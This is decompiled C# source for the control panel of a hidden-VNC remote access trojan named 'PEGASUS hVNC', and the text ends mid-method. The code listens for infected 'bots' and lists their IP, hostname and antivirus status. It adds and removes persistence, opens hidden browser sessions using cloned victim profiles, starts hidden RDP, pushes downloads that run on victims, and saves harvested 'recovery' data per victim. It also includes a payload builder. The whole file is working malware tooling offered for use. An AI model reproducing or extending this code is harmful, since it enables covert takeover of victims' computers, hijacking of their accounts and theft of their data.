using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using HVNC;
using Microsoft.VisualBasic.CompilerServices;
using PEGASUS;
using PEGASUS.Design;
using PEGASUS_LIME.Properties;

namespace PEGASUS_LIME.Design
{
	public class PEGASUS : Form
	{
		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public static string isadmin;

		public static string detecav;

		public static Random random = new Random();

		public static string PEGASUSRecoveryResults;

		public int count;

		public static bool ispressed = false;

		public static string userFame = Environment.UserName;

		private IContainer components = null;

		private ToolStripMenuItem HVNCListenBtn;

		private ToolStripMenuItem portToolStripMenuItem;

		private ToolStripTextBox HVNCListenPort;

		private ToolStripSeparator toolStripSeparator3;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Guna2ControlBox guna2ControlBox1;

		private Guna2ControlBox guna2ControlBox3;

		private Guna2ControlBox guna2ControlBox2;

		private Label label1;

		private Label label2;

		private Guna2PictureBox guna2PictureBox1;

		private Label label8;

		public Guna2ToggleSwitch chkSounds;

		private Label Listener;

		private Label label5;

		private Label label6;

		private Label label9;

		private Guna2ContextMenuStrip guna2ContextMenuStrip1;

		private Label label11;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel ClientsOnline;

		public Guna2ToggleSwitch StartPort;

		private Label label12;

		private Label label13;

		private Guna2NumericUpDown ListenPort;

		private ImageList imageList1;

		private Guna2DragControl guna2DragControl1;

		private ImageList imageList2;

		private ToolStripMenuItem toolStripMenuItem2;

		private ToolStripMenuItem visitURL;

		private ToolStripMenuItem killChrome;

		private ToolStripMenuItem resetScale;

		private ToolStripMenuItem toolStripMenuItem6;

		private ToolStripMenuItem fromURL;

		private ToolStripMenuItem StartHvnc;

		private ToolStripMenuItem Recover;

		public ListView HVNCList;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader7;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader8;

		private ColumnHeader columnHeader9;

		private ColumnHeader columnHeader10;

		private Guna2VScrollBar guna2VScrollBar1;

		private ToolStripMenuItem builderToolStripMenuItem;

		private ToolStripMenuItem hVNCCToolStripMenuItem;

		private ToolStripMenuItem aDDPERSISTENCEToolStripMenuItem;

		private ToolStripMenuItem uNINSTALLToolStripMenuItem1;

		private ToolStripMenuItem rEMOVEPERSISTENCEToolStripMenuItem;

		private ToolStripMenuItem aDDPERSISTENCEToolStripMenuItem1;

		private System.Windows.Forms.Timer timer1;

		private ToolStripMenuItem hRDPToolStripMenuItem;

		private ToolStripMenuItem iNSTALLToolStripMenuItem;

		private ToolStripMenuItem cOPYPROFILEToolStripMenuItem;

		private ToolStripMenuItem rEMOVEToolStripMenuItem;

		private Guna2Separator bunifuSeparator1;

		public Label label10;

		public Label label3;

		private Label label4;

		public static string saveurl { get; set; }

		public static string MassURL { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public PEGASUS()
		{
			InitializeComponent();
		}

		private void HVNCListenBtn_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(Listener.Text, "Not Listening", TextCompare: false) == 0)
			{
				Listener.Text = "Listening on " + ListenPort.Text;
				HVNCListenBtn.Image = imageList2.Images[0];
				HVNCListenPort.Enabled = false;
				VNC_Thread = new Thread(Listenning)
				{
					IsBackground = true
				};
				bool_1 = true;
				VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			while (true)
			{
				try
				{
					try
					{
						foreach (Form openForm in Application.OpenForms)
						{
							if (openForm.Name.Contains("FrmVNC"))
							{
								openForm.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			HVNCListenPort.Enabled = true;
			VNC_Thread.Abort();
			bool_1 = false;
			Listener.Text = "Not Listening";
			HVNCListenBtn.Image = imageList2.Images[1];
			HVNCList.Items.Clear();
			_TcpListener.Stop();
			checked
			{
				int num = _clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					_clientList[i].Close();
				}
				_clientList = new List<TcpClient>();
				int_2 = 0;
				ClientsOnline.Text = "Clients Online: 0";
			}
		}

		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			HVNCListenBtn.PerformClick();
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					_clientList = new List<TcpClient>();
					_TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(ListenPort.Text));
					_TcpListener.Start();
					_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (ex.Message.Contains("aborted"))
						{
							return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									foreach (Form openForm in Application.OpenForms)
									{
										if (openForm.Name.Contains("FrmVNC"))
										{
											openForm.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						bool_1 = false;
						HVNCListenBtn.Text = "Listen";
						int num = _clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							_clientList[i].Close();
						}
						_clientList = new List<TcpClient>();
						int_2 = 0;
						_TcpListener.Stop();
						ClientsOnline.Text = "Clients Online: 0";
					}
					catch (Exception)
					{
					}
				}
			}
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
			}
			catch (Exception)
			{
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}
					ulong num4 = BitConverter.ToUInt64(array, 0);
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num5 = 0;
						int num6 = array2.Length;
						while (num6 > 0)
						{
							int num7 = tcpClient.GetStream().Read(array2, num5, num6);
							num6 -= num7;
							num5 += num7;
						}
						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
								{
									string text;
									try
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										string text2 = new Ping().Send(((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address).RoundtripTime.ToString();
										ListViewItem lvi2 = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											text2
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((ThreadStart)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi2);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
									catch (Exception)
									{
										ListViewItem lvi = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											"N/A"
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((ThreadStart)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
								}
								else if (_clientList.Contains(tcpClient))
								{
									GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception)
							{
							}
						}
						else if (_clientList.Contains(tcpClient))
						{
							GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				}
				catch (Exception ex3)
				{
					if (!ex3.Message.Contains("disposed"))
					{
						try
						{
							if (_clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											Invoke((ThreadStart)delegate
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											});
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								HVNCList.Invoke((ThreadStart)delegate
								{
									lock (_clientList)
									{
										try
										{
											int index = _clientList.IndexOf(tcpClient);
											_clientList.RemoveAt(index);
											HVNCList.Items.RemoveAt(index);
											tcpClient.Close();
											int_2--;
											ClientsOnline.Text = "Clients Online: " + Conversions.ToString(int_2);
										}
										catch (Exception)
										{
										}
									}
								});
							}
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					tcpClient.Close();
				}
			}
		}

		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(tcpClient_0.GetHashCode())];
			if (!(object_2 is Bitmap))
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] array = Conversions.ToString(object_2).Split('|');
				string left = array[0];
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				}
				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
				}
				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
				}
				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
				}
				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}
				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
				}
				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
					frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
				}
				if (Operators.CompareString(left, "23", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
				}
				if (Operators.CompareString(left, "24", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
				}
				if (Operators.CompareString(left, "25", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "26", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				Operators.CompareString(left, "719", TextCompare: false);
				if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
				{
					Clipboard.SetText(array[1].ToString());
				}
				if (Operators.CompareString(left, "3308", TextCompare: false) == 0)
				{
					if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\PEGASUSRecovery"))
					{
						Directory.CreateDirectory("PEGASUSRecovery");
					}
					PEGASUSRecoveryResults = array[1].ToString();
					if (!PEGASUSRecoveryResults.Contains("System"))
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\PEGASUSRecovery\\" + xxip + "_" + xxhostname + "_PEGASUSRecovery.txt", PEGASUSRecoveryResults);
					}
					GC.Collect();
				}
			}
			else
			{
				frmVNC.VNCBoxe.Image = (Image)object_2;
			}
		}

		private void SetLastColumnWidth()
		{
			HVNCList.Columns[HVNCList.Columns.Count - 1].Width = -2;
		}

		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			checked
			{
				if (e.Item.Selected)
				{
					e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
					Graphics graphics = e.Graphics;
					string text = e.SubItem.Text;
					Font font = new Font("Electrolize", 9f, FontStyle.Regular, GraphicsUnit.Point);
					int num = e.Bounds.Left + 3;
					int num2 = e.Bounds.Top + 2;
					Point pt = new Point(num, num2);
					Color white = Color.White;
					TextRenderer.DrawText(graphics, text, font, pt, white);
				}
				else
				{
					e.DrawDefault = true;
				}
			}
		}

		private void PEGASUS_Load(object sender, EventArgs e)
		{
			ListenPort.ForeColor = Color.White;
			SetLastColumnWidth();
			HVNCList.Columns[1].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[2].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[3].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[4].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[5].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[6].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[7].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[8].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[9].TextAlign = HorizontalAlignment.Center;
			HVNCList.View = View.Details;
			HVNCList.HideSelection = false;
			HVNCList.OwnerDraw = true;
			HVNCList.BackColor = Color.Black;
			HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.Black);
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.FromArgb(9, 248, 121));
			};
			HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			StartPort.Checked = true;
			HVNCListenBtn.PerformClick();
			ClientsOnline.Text = "Bots Online: 0";
			label10.Text = userFame;
			timer1.Enabled = true;
		}

		private void PEGASUS_FormClosed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(Environment.ExitCode);
		}

		private void StartPort_CheckedChanged(object sender, EventArgs e)
		{
			if (StartPort.Checked)
			{
				ListenPort.Enabled = false;
			}
			else if (!StartPort.Checked)
			{
				ListenPort.Enabled = true;
			}
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			HVNCList.Refresh();
		}

		private void aDDPERSISTENCEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8890* ", (TcpClient)tag);
			}
		}

		private void rEMOVEPERSISTENCEToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8891* ", (TcpClient)tag);
			}
		}

		private void visitURL_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
					return;
				}
				int num = (int)new FrmURL().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.hURL(saveurl);
					frmVNC.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		private void killChrome_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.KillChrome();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void resetScale_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void fromURL_Click(object sender, EventArgs e)
		{
			try
			{
				if (HVNCList.SelectedItems.Count == 0)
				{
					MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
					return;
				}
				int num = (int)new FrmMassUpdate().ShowDialog();
				if (!ispressed)
				{
					return;
				}
				FrmVNC frmVNC = new FrmVNC();
				foreach (object selectedItem in HVNCList.SelectedItems)
				{
					count = HVNCList.SelectedItems.Count;
				}
				for (int i = 0; i < count; i++)
				{
					frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
					object obj = (frmVNC.Tag = HVNCList.SelectedItems[i].Tag);
					frmVNC.UpdateClient(MassURL);
					frmVNC.Dispose();
				}
				MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
				ispressed = false;
			}
			catch (Exception)
			{
				MsgBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				Close();
			}
		}

		private void StartHvnc_Click(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (HVNCList.FocusedItem.Index == -1)
					{
						return;
					}
					for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
					{
						if (Application.OpenForms[i].Tag == _clientList[HVNCList.FocusedItem.Index])
						{
							Application.OpenForms[i].Show();
							return;
						}
					}
					FrmVNC frmVNC = new FrmVNC();
					frmVNC.Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode());
					frmVNC.Tag = _clientList[HVNCList.FocusedItem.Index];
					string text = HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
						.Replace("}", null)
						.Replace(":", null)
						.Remove(0, 1);
					string text2 = HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
						.Replace("}", null)
						.Replace(":", null)
						.Remove(0, 1);
					frmVNC.Text = text + ":" + text2;
					frmVNC.ClientRecoveryLabel.Text = text + ":" + text2;
					frmVNC.Show();
				}
				catch (Exception)
				{
					MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				}
			}
		}

		private void Recover_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string xip = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				xxip = xip;
				xxhostname = xhostname;
				frmVNC.xip = xip;
				frmVNC.xhostname = xhostname;
				frmVNC.Tag = tag;
				frmVNC.PEGASUSRecovery();
				frmVNC.Dispose();
			}
			MsgBox.Show("Operation Completed To Selected Clients: " + count, "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Shield);
		}

		private void builderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			int num = (int)new FrmBuilder(ListenPort.Text).ShowDialog();
		}

		private void hVNCCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			VNCForm vNCForm = new VNCForm();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				vNCForm.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				vNCForm.Tag = tag;
				vNCForm.StartCort();
				vNCForm.Dispose();
			}
			VNCForm vNCForm2 = new VNCForm();
			vNCForm2.ShowDialog();
		}

		private void uNINSTALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string text2 = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				SendTCP("8889* ", (TcpClient)tag);
				if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
				{
					break;
				}
				SendTCP("24*", (TcpClient)tag);
				SendTCP("8889* ", (TcpClient)tag);
			}
		}

		private void iNSTALLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MsgBox.Show("You have to select a client first! ", "PEGASUS hVNC", MsgBox.Buttons.OK, MsgBox.Icon.Warning);
				return;
			}
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				object tag = HVNCList.SelectedItems[i].Tag;
				string text = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
